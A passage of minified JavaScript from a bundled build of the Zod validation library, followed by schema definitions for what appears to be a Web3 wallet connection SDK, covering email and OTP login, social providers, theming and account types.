0:t.coerce)||!1,typeName:Ae.ZodDate,...Re(t)});class Kd extends Me{_parse(e){if(this._getType(e)!==ue.symbol){const n=this._getOrReturnCtx(e);return fe(n,{code:re.invalid_type,expected:ue.symbol,received:n.parsedType}),Ne}return en(e.data)}}Kd.create=t=>new Kd({typeName:Ae.ZodSymbol,...Re(t)});class El extends Me{_parse(e){if(this._getType(e)!==ue.undefined){const n=this._getOrReturnCtx(e);return fe(n,{code:re.invalid_type,expected:ue.undefined,received:n.parsedType}),Ne}return en(e.data)}}El.create=t=>new El({typeName:Ae.ZodUndefined,...Re(t)});class Al extends Me{_parse(e){if(this._getType(e)!==ue.null){const n=this._getOrReturnCtx(e);return fe(n,{code:re.invalid_type,expected:ue.null,received:n.parsedType}),Ne}return en(e.data)}}Al.create=t=>new Al({typeName:Ae.ZodNull,...Re(t)});class Ic extends Me{constructor(){super(...arguments),this._any=!0}_parse(e){return en(e.data)}}Ic.create=t=>new Ic({typeName:Ae.ZodAny,...Re(t)});class Ko extends Me{constructor(){super(...arguments),this._unknown=!0}_parse(e){return en(e.data)}}Ko.create=t=>new Ko({typeName:Ae.ZodUnknown,...Re(t)});class vs extends Me{_parse(e){const r=this._getOrReturnCtx(e);return fe(r,{code:re.invalid_type,expected:ue.never,received:r.parsedType}),Ne}}vs.create=t=>new vs({typeName:Ae.ZodNever,...Re(t)});class Qd extends Me{_parse(e){if(this._getType(e)!==ue.undefined){const n=this._getOrReturnCtx(e);return fe(n,{code:re.invalid_type,expected:ue.void,received:n.parsedType}),Ne}return en(e.data)}}Qd.create=t=>new Qd({typeName:Ae.ZodVoid,...Re(t)});class gi extends Me{_parse(e){const{ctx:r,status:n}=this._processInputParams(e),i=this._def;if(r.parsedType!==ue.array)return fe(r,{code:re.invalid_type,expected:ue.array,received:r.parsedType}),Ne;if(i.exactLength!==null){const o=r.data.length>i.exactLength.value,a=r.data.length<i.exactLength.value;(o||a)&&(fe(r,{code:o?re.too_big:re.too_small,minimum:a?i.exactLength.value:void 0,maximum:o?i.exactLength.value:void 0,type:"array",inclusive:!0,exact:!0,message:i.exactLength.message}),n.dirty())}if(i.minLength!==null&&r.data.length<i.minLength.value&&(fe(r,{code:re.too_small,minimum:i.minLength.value,type:"array",inclusive:!0,exact:!1,message:i.minLength.message}),n.dirty()),i.maxLength!==null&&r.data.length>i.maxLength.value&&(fe(r,{code:re.too_big,maximum:i.maxLength.value,type:"array",inclusive:!0,exact:!1,message:i.maxLength.message}),n.dirty()),r.common.async)return Promise.all([...r.data].map((o,a)=>i.type._parseAsync(new Hi(r,o,r.path,a)))).then(o=>Wr.mergeArray(n,o));const s=[...r.data].map((o,a)=>i.type._parseSync(new Hi(r,o,r.path,a)));return Wr.mergeArray(n,s)}get element(){return this._def.type}min(e,r){return new gi({...this._def,minLength:{value:e,message:be.toString(r)}})}max(e,r){return new gi({...this._def,maxLength:{value:e,message:be.toString(r)}})}length(e,r){return new gi({...this._def,exactLength:{value:e,message:be.toString(r)}})}nonempty(e){return this.min(1,e)}}gi.create=(t,e)=>new gi({type:t,minLength:null,maxLength:null,exactLength:null,typeName:Ae.ZodArray,...Re(e)});function Qa(t){if(t instanceof Jt){const e={};for(const r in t.shape){const n=t.shape[r];e[r]=ms.create(Qa(n))}return new Jt({...t._def,shape:()=>e})}else return t instanceof gi?new gi({...t._def,type:Qa(t.element)}):t instanceof ms?ms.create(Qa(t.unwrap())):t instanceof ha?ha.create(Qa(t.unwrap())):t instanceof Wi?Wi.create(t.items.map(e=>Qa(e))):t}class Jt extends Me{constructor(){super(...arguments),this._cached=null,this.nonstrict=this.passthrough,this.augment=this.extend}_getCached(){if(this._cached!==null)return this._cached;const e=this._def.shape(),r=Qe.objectKeys(e);return this._cached={shape:e,keys:r}}_parse(e){if(this._getType(e)!==ue.object){const u=this._getOrReturnCtx(e);return fe(u,{code:re.invalid_type,expected:ue.object,received:u.parsedType}),Ne}const{status:n,ctx:i}=this._processInputParams(e),{shape:s,keys:o}=this._getCached(),a=[];if(!(this._def.catchall instanceof vs&&this._def.unknownKeys==="strip"))for(const u in i.data)o.includes(u)||a.push(u);const c=[];for(const u of o){const l=s[u],h=i.data[u];c.push({key:{status:"valid",value:u},value:l._parse(new Hi(i,h,i.path,u)),alwaysSet:u in i.data})}if(this._def.catchall instanceof vs){const u=this._def.unknownKeys;if(u==="passthrough")for(const l of a)c.push({key:{status:"valid",value:l},value:{status:"valid",value:i.data[l]}});else if(u==="strict")a.length>0&&(fe(i,{code:re.unrecognized_keys,keys:a}),n.dirty());else if(u!=="strip")throw new Error("Internal ZodObject error: invalid unknownKeys value.")}else{const u=this._def.catchall;for(const l of a){const h=i.data[l];c.push({key:{status:"valid",value:l},value:u._parse(new Hi(i,h,i.path,l)),alwaysSet:l in i.data})}}return i.common.async?Promise.resolve().then(async()=>{const u=[];for(const l of c){const h=await l.key;u.push({key:h,value:await l.value,alwaysSet:l.alwaysSet})}return u}).then(u=>Wr.mergeObjectSync(n,u)):Wr.mergeObjectSync(n,c)}get shape(){return this._def.shape()}strict(e){return be.errToObj,new Jt({...this._def,unknownKeys:"strict",...e!==void 0?{errorMap:(r,n)=>{var i,s,o,a;const c=(o=(s=(i=this._def).errorMap)===null||s===void 0?void 0:s.call(i,r,n).message)!==null&&o!==void 0?o:n.defaultError;return r.code==="unrecognized_keys"?{message:(a=be.errToObj(e).message)!==null&&a!==void 0?a:c}:{message:c}}}:{}})}strip(){return new Jt({...this._def,unknownKeys:"strip"})}passthrough(){return new Jt({...this._def,unknownKeys:"passthrough"})}extend(e){return new Jt({...this._def,shape:()=>({...this._def.shape(),...e})})}merge(e){return new Jt({unknownKeys:e._def.unknownKeys,catchall:e._def.catchall,shape:()=>({...this._def.shape(),...e._def.shape()}),typeName:Ae.ZodObject})}setKey(e,r){return this.augment({[e]:r})}catchall(e){return new Jt({...this._def,catchall:e})}pick(e){const r={};return Qe.objectKeys(e).forEach(n=>{e[n]&&this.shape[n]&&(r[n]=this.shape[n])}),new Jt({...this._def,shape:()=>r})}omit(e){const r={};return Qe.objectKeys(this.shape).forEach(n=>{e[n]||(r[n]=this.shape[n])}),new Jt({...this._def,shape:()=>r})}deepPartial(){return Qa(this)}partial(e){const r={};return Qe.objectKeys(this.shape).forEach(n=>{const i=this.shape[n];e&&!e[n]?r[n]=i:r[n]=i.optional()}),new Jt({...this._def,shape:()=>r})}required(e){const r={};return Qe.objectKeys(this.shape).forEach(n=>{if(e&&!e[n])r[n]=this.shape[n];else{let s=this.shape[n];for(;s instanceof ms;)s=s._def.innerType;r[n]=s}}),new Jt({...this._def,shape:()=>r})}keyof(){return S2(Qe.objectKeys(this.shape))}}Jt.create=(t,e)=>new Jt({shape:()=>t,unknownKeys:"strip",catchall:vs.create(),typeName:Ae.ZodObject,...Re(e)});Jt.strictCreate=(t,e)=>new Jt({shape:()=>t,unknownKeys:"strict",catchall:vs.create(),typeName:Ae.ZodObject,...Re(e)});Jt.lazycreate=(t,e)=>new Jt({shape:t,unknownKeys:"strip",catchall:vs.create(),typeName:Ae.ZodObject,...Re(e)});class _l extends Me{_parse(e){const{ctx:r}=this._processInputParams(e),n=this._def.options;function i(s){for(const a of s)if(a.result.status==="valid")return a.result;for(const a of s)if(a.result.status==="dirty")return r.common.issues.push(...a.ctx.common.issues),a.result;const o=s.map(a=>new pi(a.ctx.common.issues));return fe(r,{code:re.invalid_union,unionErrors:o}),Ne}if(r.common.async)return Promise.all(n.map(async s=>{const o={...r,common:{...r.common,issues:[]},parent:null};return{result:await s._parseAsync({data:r.data,path:r.path,parent:o}),ctx:o}})).then(i);{let s;const o=[];for(const c of n){const u={...r,common:{...r.common,issues:[]},parent:null},l=c._parseSync({data:r.data,path:r.path,parent:u});if(l.status==="valid")return l;l.status==="dirty"&&!s&&(s={result:l,ctx:u}),u.common.issues.length&&o.push(u.common.issues)}if(s)return r.common.issues.push(...s.ctx.common.issues),s.result;const a=o.map(c=>new pi(c));return fe(r,{code:re.invalid_union,unionErrors:a}),Ne}}get options(){return this._def.options}}_l.create=(t,e)=>new _l({options:t,typeName:Ae.ZodUnion,...Re(e)});const hd=t=>t instanceof xl?hd(t.schema):t instanceof mi?hd(t.innerType()):t instanceof Sl?[t.value]:t instanceof oo?t.options:t instanceof Nl?Object.keys(t.enum):t instanceof Tl?hd(t._def.innerType):t instanceof El?[void 0]:t instanceof Al?[null]:null;class Kf extends Me{_parse(e){const{ctx:r}=this._processInputParams(e);if(r.parsedType!==ue.object)return fe(r,{code:re.invalid_type,expected:ue.object,received:r.parsedType}),Ne;const n=this.discriminator,i=r.data[n],s=this.optionsMap.get(i);return s?r.common.async?s._parseAsync({data:r.data,path:r.path,parent:r}):s._parseSync({data:r.data,path:r.path,parent:r}):(fe(r,{code:re.invalid_union_discriminator,options:Array.from(this.optionsMap.keys()),path:[n]}),Ne)}get discriminator(){return this._def.discriminator}get options(){return this._def.options}get optionsMap(){return this._def.optionsMap}static create(e,r,n){const i=new Map;for(const s of r){const o=hd(s.shape[e]);if(!o)throw new Error(`A discriminator value for key \`${e}\` could not be extracted from all schema options`);for(const a of o){if(i.has(a))throw new Error(`Discriminator property ${String(e)} has duplicate value ${String(a)}`);i.set(a,s)}}return new Kf({typeName:Ae.ZodDiscriminatedUnion,discriminator:e,options:r,optionsMap:i,...Re(n)})}}function I0(t,e){const r=Hs(t),n=Hs(e);if(t===e)return{valid:!0,data:t};if(r===ue.object&&n===ue.object){const i=Qe.objectKeys(e),s=Qe.objectKeys(t).filter(a=>i.indexOf(a)!==-1),o={...t,...e};for(const a of s){const c=I0(t[a],e[a]);if(!c.valid)return{valid:!1};o[a]=c.data}return{valid:!0,data:o}}else if(r===ue.array&&n===ue.array){if(t.length!==e.length)return{valid:!1};const i=[];for(let s=0;s<t.length;s++){const o=t[s],a=e[s],c=I0(o,a);if(!c.valid)return{valid:!1};i.push(c.data)}return{valid:!0,data:i}}else return r===ue.date&&n===ue.date&&+t==+e?{valid:!0,data:t}:{valid:!1}}class Cl extends Me{_parse(e){const{status:r,ctx:n}=this._processInputParams(e),i=(s,o)=>{if(_0(s)||_0(o))return Ne;const a=I0(s.value,o.value);return a.valid?((C0(s)||C0(o))&&r.dirty(),{status:r.value,value:a.data}):(fe(n,{code:re.invalid_intersection_types}),Ne)};return n.common.async?Promise.all([this._def.left._parseAsync({data:n.data,path:n.path,parent:n}),this._def.right._parseAsync({data:n.data,path:n.path,parent:n})]).then(([s,o])=>i(s,o)):i(this._def.left._parseSync({data:n.data,path:n.path,parent:n}),this._def.right._parseSync({data:n.data,path:n.path,parent:n}))}}Cl.create=(t,e,r)=>new Cl({left:t,right:e,typeName:Ae.ZodIntersection,...Re(r)});class Wi extends Me{_parse(e){const{status:r,ctx:n}=this._processInputParams(e);if(n.parsedType!==ue.array)return fe(n,{code:re.invalid_type,expected:ue.array,received:n.parsedType}),Ne;if(n.data.length<this._def.items.length)return fe(n,{code:re.too_small,minimum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),Ne;!this._def.rest&&n.data.length>this._def.items.length&&(fe(n,{code:re.too_big,maximum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),r.dirty());const s=[...n.data].map((o,a)=>{const c=this._def.items[a]||this._def.rest;return c?c._parse(new Hi(n,o,n.path,a)):null}).filter(o=>!!o);return n.common.async?Promise.all(s).then(o=>Wr.mergeArray(r,o)):Wr.mergeArray(r,s)}get items(){return this._def.items}rest(e){return new Wi({...this._def,rest:e})}}Wi.create=(t,e)=>{if(!Array.isArray(t))throw new Error("You must pass an array of schemas to z.tuple([ ... ])");return new Wi({items:t,typeName:Ae.ZodTuple,rest:null,...Re(e)})};class Il extends Me{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(e){const{status:r,ctx:n}=this._processInputParams(e);if(n.parsedType!==ue.object)return fe(n,{code:re.invalid_type,expected:ue.object,received:n.parsedType}),Ne;const i=[],s=this._def.keyType,o=this._def.valueType;for(const a in n.data)i.push({key:s._parse(new Hi(n,a,n.path,a)),value:o._parse(new Hi(n,n.data[a],n.path,a))});return n.common.async?Wr.mergeObjectAsync(r,i):Wr.mergeObjectSync(r,i)}get element(){return this._def.valueType}static create(e,r,n){return r instanceof Me?new Il({keyType:e,valueType:r,typeName:Ae.ZodRecord,...Re(n)}):new Il({keyType:di.create(),valueType:e,typeName:Ae.ZodRecord,...Re(r)})}}class Yd extends Me{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(e){const{status:r,ctx:n}=this._processInputParams(e);if(n.parsedType!==ue.map)return fe(n,{code:re.invalid_type,expected:ue.map,received:n.parsedType}),Ne;const i=this._def.keyType,s=this._def.valueType,o=[...n.data.entries()].map(([a,c],u)=>({key:i._parse(new Hi(n,a,n.path,[u,"key"])),value:s._parse(new Hi(n,c,n.path,[u,"value"]))}));if(n.common.async){const a=new Map;return Promise.resolve().then(async()=>{for(const c of o){const u=await c.key,l=await c.value;if(u.status==="aborted"||l.status==="aborted")return Ne;(u.status==="dirty"||l.status==="dirty")&&r.dirty(),a.set(u.value,l.value)}return{status:r.value,value:a}})}else{const a=new Map;for(const c of o){const u=c.key,l=c.value;if(u.status==="aborted"||l.status==="aborted")return Ne;(u.status==="dirty"||l.status==="dirty")&&r.dirty(),a.set(u.value,l.value)}return{status:r.value,value:a}}}}Yd.create=(t,e,r)=>new Yd({valueType:e,keyType:t,typeName:Ae.ZodMap,...Re(r)});class la extends Me{_parse(e){const{status:r,ctx:n}=this._processInputParams(e);if(n.parsedType!==ue.set)return fe(n,{code:re.invalid_type,expected:ue.set,received:n.parsedType}),Ne;const i=this._def;i.minSize!==null&&n.data.size<i.minSize.value&&(fe(n,{code:re.too_small,minimum:i.minSize.value,type:"set",inclusive:!0,exact:!1,message:i.minSize.message}),r.dirty()),i.maxSize!==null&&n.data.size>i.maxSize.value&&(fe(n,{code:re.too_big,maximum:i.maxSize.value,type:"set",inclusive:!0,exact:!1,message:i.maxSize.message}),r.dirty());const s=this._def.valueType;function o(c){const u=new Set;for(const l of c){if(l.status==="aborted")return Ne;l.status==="dirty"&&r.dirty(),u.add(l.value)}return{status:r.value,value:u}}const a=[...n.data.values()].map((c,u)=>s._parse(new Hi(n,c,n.path,u)));return n.common.async?Promise.all(a).then(c=>o(c)):o(a)}min(e,r){return new la({...this._def,minSize:{value:e,message:be.toString(r)}})}max(e,r){return new la({...this._def,maxSize:{value:e,message:be.toString(r)}})}size(e,r){return this.min(e,r).max(e,r)}nonempty(e){return this.min(1,e)}}la.create=(t,e)=>new la({valueType:t,minSize:null,maxSize:null,typeName:Ae.ZodSet,...Re(e)});class oc extends Me{constructor(){super(...arguments),this.validate=this.implement}_parse(e){const{ctx:r}=this._processInputParams(e);if(r.parsedType!==ue.function)return fe(r,{code:re.invalid_type,expected:ue.function,received:r.parsedType}),Ne;function n(a,c){return Gd({data:a,path:r.path,errorMaps:[r.common.contextualErrorMap,r.schemaErrorMap,Wd(),wl].filter(u=>!!u),issueData:{code:re.invalid_arguments,argumentsError:c}})}function i(a,c){return Gd({data:a,path:r.path,errorMaps:[r.common.contextualErrorMap,r.schemaErrorMap,Wd(),wl].filter(u=>!!u),issueData:{code:re.invalid_return_type,returnTypeError:c}})}const s={errorMap:r.common.contextualErrorMap},o=r.data;if(this._def.returns instanceof xc){const a=this;return en(async function(...c){const u=new pi([]),l=await a._def.args.parseAsync(c,s).catch(g=>{throw u.addIssue(n(c,g)),u}),h=await Reflect.apply(o,this,l);return await a._def.returns._def.type.parseAsync(h,s).catch(g=>{throw u.addIssue(i(h,g)),u})})}else{const a=this;return en(function(...c){const u=a._def.args.safeParse(c,s);if(!u.success)throw new pi([n(c,u.error)]);const l=Reflect.apply(o,this,u.data),h=a._def.returns.safeParse(l,s);if(!h.success)throw new pi([i(l,h.error)]);return h.data})}}parameters(){return this._def.args}returnType(){return this._def.returns}args(...e){return new oc({...this._def,args:Wi.create(e).rest(Ko.create())})}returns(e){return new oc({...this._def,returns:e})}implement(e){return this.parse(e)}strictImplement(e){return this.parse(e)}static create(e,r,n){return new oc({args:e||Wi.create([]).rest(Ko.create()),returns:r||Ko.create(),typeName:Ae.ZodFunction,...Re(n)})}}class xl extends Me{get schema(){return this._def.getter()}_parse(e){const{ctx:r}=this._processInputParams(e);return this._def.getter()._parse({data:r.data,path:r.path,parent:r})}}xl.create=(t,e)=>new xl({getter:t,typeName:Ae.ZodLazy,...Re(e)});class Sl extends Me{_parse(e){if(e.data!==this._def.value){const r=this._getOrReturnCtx(e);return fe(r,{received:r.data,code:re.invalid_literal,expected:this._def.value}),Ne}return{status:"valid",value:e.data}}get value(){return this._def.value}}Sl.create=(t,e)=>new Sl({value:t,typeName:Ae.ZodLiteral,...Re(e)});function S2(t,e){return new oo({values:t,typeName:Ae.ZodEnum,...Re(e)})}class oo extends Me{_parse(e){if(typeof e.data!="string"){const r=this._getOrReturnCtx(e),n=this._def.values;return fe(r,{expected:Qe.joinValues(n),received:r.parsedType,code:re.invalid_type}),Ne}if(this._def.values.indexOf(e.data)===-1){const r=this._getOrReturnCtx(e),n=this._def.values;return fe(r,{received:r.data,code:re.invalid_enum_value,options:n}),Ne}return en(e.data)}get options(){return this._def.values}get enum(){const e={};for(const r of this._def.values)e[r]=r;return e}get Values(){const e={};for(const r of this._def.values)e[r]=r;return e}get Enum(){const e={};for(const r of this._def.values)e[r]=r;return e}extract(e){return oo.create(e)}exclude(e){return oo.create(this.options.filter(r=>!e.includes(r)))}}oo.create=S2;class Nl extends Me{_parse(e){const r=Qe.getValidEnumValues(this._def.values),n=this._getOrReturnCtx(e);if(n.parsedType!==ue.string&&n.parsedType!==ue.number){const i=Qe.objectValues(r);return fe(n,{expected:Qe.joinValues(i),received:n.parsedType,code:re.invalid_type}),Ne}if(r.indexOf(e.data)===-1){const i=Qe.objectValues(r);return fe(n,{received:n.data,code:re.invalid_enum_value,options:i}),Ne}return en(e.data)}get enum(){return this._def.values}}Nl.create=(t,e)=>new Nl({values:t,typeName:Ae.ZodNativeEnum,...Re(e)});class xc extends Me{unwrap(){return this._def.type}_parse(e){const{ctx:r}=this._processInputParams(e);if(r.parsedType!==ue.promise&&r.common.async===!1)return fe(r,{code:re.invalid_type,expected:ue.promise,received:r.parsedType}),Ne;const n=r.parsedType===ue.promise?r.data:Promise.resolve(r.data);return en(n.then(i=>this._def.type.parseAsync(i,{path:r.path,errorMap:r.common.contextualErrorMap})))}}xc.create=(t,e)=>new xc({type:t,typeName:Ae.ZodPromise,...Re(e)});class mi extends Me{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===Ae.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(e){const{status:r,ctx:n}=this._processInputParams(e),i=this._def.effect||null,s={addIssue:o=>{fe(n,o),o.fatal?r.abort():r.dirty()},get path(){return n.path}};if(s.addIssue=s.addIssue.bind(s),i.type==="preprocess"){const o=i.transform(n.data,s);return n.common.issues.length?{status:"dirty",value:n.data}:n.common.async?Promise.resolve(o).then(a=>this._def.schema._parseAsync({data:a,path:n.path,parent:n})):this._def.schema._parseSync({data:o,path:n.path,parent:n})}if(i.type==="refinement"){const o=a=>{const c=i.refinement(a,s);if(n.common.async)return Promise.resolve(c);if(c instanceof Promise)throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return a};if(n.common.async===!1){const a=this._def.schema._parseSync({data:n.data,path:n.path,parent:n});return a.status==="aborted"?Ne:(a.status==="dirty"&&r.dirty(),o(a.value),{status:r.value,value:a.value})}else return this._def.schema._parseAsync({data:n.data,path:n.path,parent:n}).then(a=>a.status==="aborted"?Ne:(a.status==="dirty"&&r.dirty(),o(a.value).then(()=>({status:r.value,value:a.value}))))}if(i.type==="transform")if(n.common.async===!1){const o=this._def.schema._parseSync({data:n.data,path:n.path,parent:n});if(!bl(o))return o;const a=i.transform(o.value,s);if(a instanceof Promise)throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:r.value,value:a}}else return this._def.schema._parseAsync({data:n.data,path:n.path,parent:n}).then(o=>bl(o)?Promise.resolve(i.transform(o.value,s)).then(a=>({status:r.value,value:a})):o);Qe.assertNever(i)}}mi.create=(t,e,r)=>new mi({schema:t,typeName:Ae.ZodEffects,effect:e,...Re(r)});mi.createWithPreprocess=(t,e,r)=>new mi({schema:e,effect:{type:"preprocess",transform:t},typeName:Ae.ZodEffects,...Re(r)});class ms extends Me{_parse(e){return this._getType(e)===ue.undefined?en(void 0):this._def.innerType._parse(e)}unwrap(){return this._def.innerType}}ms.create=(t,e)=>new ms({innerType:t,typeName:Ae.ZodOptional,...Re(e)});class ha extends Me{_parse(e){return this._getType(e)===ue.null?en(null):this._def.innerType._parse(e)}unwrap(){return this._def.innerType}}ha.create=(t,e)=>new ha({innerType:t,typeName:Ae.ZodNullable,...Re(e)});class Tl extends Me{_parse(e){const{ctx:r}=this._processInputParams(e);let n=r.data;return r.parsedType===ue.undefined&&(n=this._def.defaultValue()),this._def.innerType._parse({data:n,path:r.path,parent:r})}removeDefault(){return this._def.innerType}}Tl.create=(t,e)=>new Tl({innerType:t,typeName:Ae.ZodDefault,defaultValue:typeof e.default=="function"?e.default:()=>e.default,...Re(e)});class Jd extends Me{_parse(e){const{ctx:r}=this._processInputParams(e),n={...r,common:{...r.common,issues:[]}},i=this._def.innerType._parse({data:n.data,path:n.path,parent:{...n}});return Vd(i)?i.then(s=>({status:"valid",value:s.status==="valid"?s.value:this._def.catchValue({get error(){return new pi(n.common.issues)},input:n.data})})):{status:"valid",value:i.status==="valid"?i.value:this._def.catchValue({get error(){return new pi(n.common.issues)},input:n.data})}}removeCatch(){return this._def.innerType}}Jd.create=(t,e)=>new Jd({innerType:t,typeName:Ae.ZodCatch,catchValue:typeof e.catch=="function"?e.catch:()=>e.catch,...Re(e)});class Zd extends Me{_parse(e){if(this._getType(e)!==ue.nan){const n=this._getOrReturnCtx(e);return fe(n,{code:re.invalid_type,expected:ue.nan,received:n.parsedType}),Ne}return{status:"valid",value:e.data}}}Zd.create=t=>new Zd({typeName:Ae.ZodNaN,...Re(t)});const Mq=Symbol("zod_brand");class N2 extends Me{_parse(e){const{ctx:r}=this._processInputParams(e),n=r.data;return this._def.type._parse({data:n,path:r.path,parent:r})}unwrap(){return this._def.type}}class fh extends Me{_parse(e){const{status:r,ctx:n}=this._processInputParams(e);if(n.common.async)return(async()=>{const s=await this._def.in._parseAsync({data:n.data,path:n.path,parent:n});return s.status==="aborted"?Ne:s.status==="dirty"?(r.dirty(),x2(s.value)):this._def.out._parseAsync({data:s.value,path:n.path,parent:n})})();{const i=this._def.in._parseSync({data:n.data,path:n.path,parent:n});return i.status==="aborted"?Ne:i.status==="dirty"?(r.dirty(),{status:"dirty",value:i.value}):this._def.out._parseSync({data:i.value,path:n.path,parent:n})}}static create(e,r){return new fh({in:e,out:r,typeName:Ae.ZodPipeline})}}class Xd extends Me{_parse(e){const r=this._def.innerType._parse(e);return bl(r)&&(r.value=Object.freeze(r.value)),r}}Xd.create=(t,e)=>new Xd({innerType:t,typeName:Ae.ZodReadonly,...Re(e)});const T2=(t,e={},r)=>t?Ic.create().superRefine((n,i)=>{var s,o;if(!t(n)){const a=typeof e=="function"?e(n):typeof e=="string"?{message:e}:e,c=(o=(s=a.fatal)!==null&&s!==void 0?s:r)!==null&&o!==void 0?o:!0,u=typeof a=="string"?{message:a}:a;i.addIssue({code:"custom",...u,fatal:c})}}):Ic.create(),Bq={object:Jt.lazycreate};var Ae;(function(t){t.ZodString="ZodString",t.ZodNumber="ZodNumber",t.ZodNaN="ZodNaN",t.ZodBigInt="ZodBigInt",t.ZodBoolean="ZodBoolean",t.ZodDate="ZodDate",t.ZodSymbol="ZodSymbol",t.ZodUndefined="ZodUndefined",t.ZodNull="ZodNull",t.ZodAny="ZodAny",t.ZodUnknown="ZodUnknown",t.ZodNever="ZodNever",t.ZodVoid="ZodVoid",t.ZodArray="ZodArray",t.ZodObject="ZodObject",t.ZodUnion="ZodUnion",t.ZodDiscriminatedUnion="ZodDiscriminatedUnion",t.ZodIntersection="ZodIntersection",t.ZodTuple="ZodTuple",t.ZodRecord="ZodRecord",t.ZodMap="ZodMap",t.ZodSet="ZodSet",t.ZodFunction="ZodFunction",t.ZodLazy="ZodLazy",t.ZodLiteral="ZodLiteral",t.ZodEnum="ZodEnum",t.ZodEffects="ZodEffects",t.ZodNativeEnum="ZodNativeEnum",t.ZodOptional="ZodOptional",t.ZodNullable="ZodNullable",t.ZodDefault="ZodDefault",t.ZodCatch="ZodCatch",t.ZodPromise="ZodPromise",t.ZodBranded="ZodBranded",t.ZodPipeline="ZodPipeline",t.ZodReadonly="ZodReadonly"})(Ae||(Ae={}));const Uq=(t,e={message:`Input not instance of ${t.name}`})=>T2(r=>r instanceof t,e),P2=di.create,R2=io.create,$q=Zd.create,Lq=so.create,O2=vl.create,Fq=ua.create,jq=Kd.create,qq=El.create,zq=Al.create,Hq=Ic.create,Wq=Ko.create,Gq=vs.create,Vq=Qd.create,Kq=gi.create,Qq=Jt.create,Yq=Jt.strictCreate,Jq=_l.create,Zq=Kf.create,Xq=Cl.create,ez=Wi.create,tz=Il.create,rz=Yd.create,nz=la.create,iz=oc.create,sz=xl.create,oz=Sl.create,az=oo.create,cz=Nl.create,uz=xc.create,jE=mi.create,lz=ms.create,hz=ha.create,dz=mi.createWithPreprocess,fz=fh.create,pz=()=>P2().optional(),gz=()=>R2().optional(),mz=()=>O2().optional(),yz={string:t=>di.create({...t,coerce:!0}),number:t=>io.create({...t,coerce:!0}),boolean:t=>vl.create({...t,coerce:!0}),bigint:t=>so.create({...t,coerce:!0}),date:t=>ua.create({...t,coerce:!0})},wz=Ne;var U=Object.freeze({__proto__:null,defaultErrorMap:wl,setErrorMap:Aq,getErrorMap:Wd,makeIssue:Gd,EMPTY_PATH:_q,addIssueToContext:fe,ParseStatus:Wr,INVALID:Ne,DIRTY:x2,OK:en,isAborted:_0,isDirty:C0,isValid:bl,isAsync:Vd,get util(){return Qe},get objectUtil(){return A0},ZodParsedType:ue,getParsedType:Hs,ZodType:Me,ZodString:di,ZodNumber:io,ZodBigInt:so,ZodBoolean:vl,ZodDate:ua,ZodSymbol:Kd,ZodUndefined:El,ZodNull:Al,ZodAny:Ic,ZodUnknown:Ko,ZodNever:vs,ZodVoid:Qd,ZodArray:gi,ZodObject:Jt,ZodUnion:_l,ZodDiscriminatedUnion:Kf,ZodIntersection:Cl,ZodTuple:Wi,ZodRecord:Il,ZodMap:Yd,ZodSet:la,ZodFunction:oc,ZodLazy:xl,ZodLiteral:Sl,ZodEnum:oo,ZodNativeEnum:Nl,ZodPromise:xc,ZodEffects:mi,ZodTransformer:mi,ZodOptional:ms,ZodNullable:ha,ZodDefault:Tl,ZodCatch:Jd,ZodNaN:Zd,BRAND:Mq,ZodBranded:N2,ZodPipeline:fh,ZodReadonly:Xd,custom:T2,Schema:Me,ZodSchema:Me,late:Bq,get ZodFirstPartyTypeKind(){return Ae},coerce:yz,any:Hq,array:Kq,bigint:Lq,boolean:O2,date:Fq,discriminatedUnion:Zq,effect:jE,enum:az,function:iz,instanceof:Uq,intersection:Xq,lazy:sz,literal:oz,map:rz,nan:$q,nativeEnum:cz,never:Gq,null:zq,nullable:hz,number:R2,object:Qq,oboolean:mz,onumber:gz,optional:lz,ostring:pz,pipeline:fz,preprocess:dz,promise:uz,record:tz,set:nz,strictObject:Yq,string:P2,symbol:jq,transformer:jE,tuple:ez,undefined:qq,union:Jq,unknown:Wq,void:Vq,NEVER:wz,ZodIssueCode:re,quotelessJson:Eq,ZodError:pi});const Zt=U.object({message:U.string()});function he(t){return U.literal(me[t])}U.object({accessList:U.array(U.string()),blockHash:U.string().nullable(),blockNumber:U.string().nullable(),chainId:U.string().or(U.number()),from:U.string(),gas:U.string(),hash:U.string(),input:U.string().nullable(),maxFeePerGas:U.string(),maxPriorityFeePerGas:U.string(),nonce:U.string(),r:U.string(),s:U.string(),to:U.string(),transactionIndex:U.string().nullable(),type:U.string(),v:U.string(),value:U.string()});const bz=U.object({chainId:U.string().or(U.number())}),vz=U.object({email:U.string().email()}),Ez=U.object({otp:U.string()}),Az=U.object({uri:U.string()}),_z=U.object({chainId:U.optional(U.string().or(U.number())),preferredAccountType:U.optional(U.string())}),Cz=U.object({provider:U.enum(["google","github","apple","facebook","x","discord"])}),Iz=U.object({email:U.string().email()}),xz=U.object({otp:U.string()}),Sz=U.object({otp:U.string()}),Nz=U.object({themeMode:U.optional(U.enum(["light","dark"])),themeVariables:U.optional(U.record(U.string(),U.string().or(U.number()))),w3mThemeVariables:U.optional(U.record(U.string(),U.string()))}),Tz=U.object({metadata:U.object({name:U.string(),description:U.string(),url:U.string(),icons:U.array(U.string())}).optional(),sdkVersion:U.string().optional(),sdkType:U.string().optional(),projectId:U.string()}),Pz=U.object({type:U.string()}),Rz=U.object({action:U.enum(["VERIFY_DEVICE","VERIFY_OTP","CONNECT"])}),Oz=U.object({url:U.string()}),kz=U.object({userName:U.string()}),Dz=U.object({email:U.string().optional().nullable(),address:U.string(),chainId:U.string().or(U.number()),accounts:U.array(U.object({address:U.string(),type:U.enum([cr.ACCOUNT_TYPES.EOA,cr.ACCOUNT_TYPES.SMART_ACCOUNT])})).optional(),userName:U.string().optional().nullable()}),Mz=U.object({action:U.enum(["VERIFY_PRIMARY_OTP","VERIFY_SECONDARY_OTP"])}),Bz=U.object({email:U.string().email().optional().nullable(),address:U.string(),chainId:U.string().or(U.number()),smartAccountDeployed:U.optional(U.boolean()),accounts:U.array(U.object({address:U.string(),type:U.enum([cr.ACCOUNT_TYPES.EOA,cr.ACCOUNT_TYPES.SMART_ACCOUNT])})).optional(),preferred